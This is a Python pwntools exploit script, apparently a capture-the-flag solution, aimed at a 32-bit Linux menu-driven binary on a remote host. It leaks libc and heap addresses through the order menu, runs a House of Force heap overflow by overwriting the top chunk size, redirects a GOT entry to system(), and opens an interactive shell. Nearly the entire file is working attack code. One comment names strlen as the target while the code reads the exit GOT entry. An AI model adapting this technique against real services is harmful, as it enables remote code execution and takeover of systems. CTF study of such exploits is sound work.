#!/usr/bin/env python

from pwn import *

import socket
import re
import binascii
import time

def p32(addr):
	return struct.pack('<L', addr)
def p64(addr):
	return struct.pack('<Q', addr)
def i32(data):
	return int(struct.unpack('<I', data)[0])
def libc(offset):
	return struct.pack('<I', libc_base + offset)
def flat(data):
	return ''.join(data)

def pwn(chall_ip, port, magic=False):
	global r
	r = remote(chall_ip, port)
	pwnlib.ui.pause()

	# add three orders
	print r.readuntil('>')
	r.sendline('1')	
	r.readuntil(':')
	r.sendline('1')
	r.sendline('n')
	
	print r.readuntil('>')
	r.sendline('1')	
	r.readuntil(':')
	r.sendline('1')
	r.sendline('n')

	print r.readuntil('>')
	r.sendline('1')	
	r.readuntil(':')
	r.sendline('1')
	r.sendline('y')
	r.sendline(target_name)

	# select order 0 for leaking later on
	print r.readuntil('>')
	r.sendline('3')
	print r.readuntil(':')
	r.sendline('2')
	print r.readuntil(':')
	r.sendline('n')

	#leak libc
	print r.readuntil('>')
	r.sendline('3')
	print r.readuntil('Name: {}'.format(target_name))
	r.read(1)
	libc_leak = i32(r.read(4))
	log.success("libc leak: {}".format(hex(libc_leak)))
	libc_leak -= libc_offset
	log.success("libc base: {}".format(hex(libc_leak)))
	print r.readuntil(':')
	r.sendline('y')
	print r.readuntil(':')
	r.sendline('0')
	print r.readuntil(':')
	r.sendline('n')

	# delete orders in correct order to add fwd/bk ptrs to order 0
	print r.readuntil('>')
	r.sendline('2')
	r.sendline('1')
	print r.readuntil('>')
	r.sendline('2')
	r.sendline('0')

	# leak heap ptr and adjust
	print r.readuntil('>')
	r.sendline('3')
	r.readuntil('Id: ')
	heap_leak = int(r.readuntil('\n')[:-1], 0)
	log.success("heap leak: {}".format(hex(heap_leak)))
	heap_leak += heap_offset
	log.success("heap top: {}".format(hex(heap_leak)))
	r.sendline('n')
	r.sendline('n')

	# calc house of force offset
	evil_size = got_target - heap_adjust - heap_leak

	print "Evil size: {}".format(evil_size)
	print "Got target: {}".format(hex(got_target))

	# edit order name and overwrite top chunk size
	print r.readuntil('>')
	r.sendline('4')
	print r.readuntil(':')
	r.sendline('2')
	r.sendline('\xff'*250)
	print r.readuntil('!')

	# update firmware, aka malloc evil size so next 
	# malloc is on .got.strlen
	# finally overwrite .got.strlen with system() and call it
	r.sendline('0')
	print r.readuntil(':')
	r.send(str(evil_size))

	print r.readuntil(':')
	r.send('/bin/sh\0')
	print r.readuntil(':')
	r.send(p32(system_offset + libc_leak))
	r.interactive()

context(arch='i386', bits=32, os='linux')

heap_offset = 0x18
libc_offset = 0x3f22
# used to leak libc from the stack
target_name = 'A' * ((9*4) -1 )
# house of force adjustement value
heap_adjust = 78

target_bin = ELF('./chall')
# actaully targeting strlen
got_target = target_bin.got['exit']

#libc_bin = ELF('./libc.so')
libc_bin = ELF('./docker.libc.so')
system_offset = libc_bin.symbols['system']


#pwn('127.0.0.1', 6666)
pwn('52.30.206.11', 1337)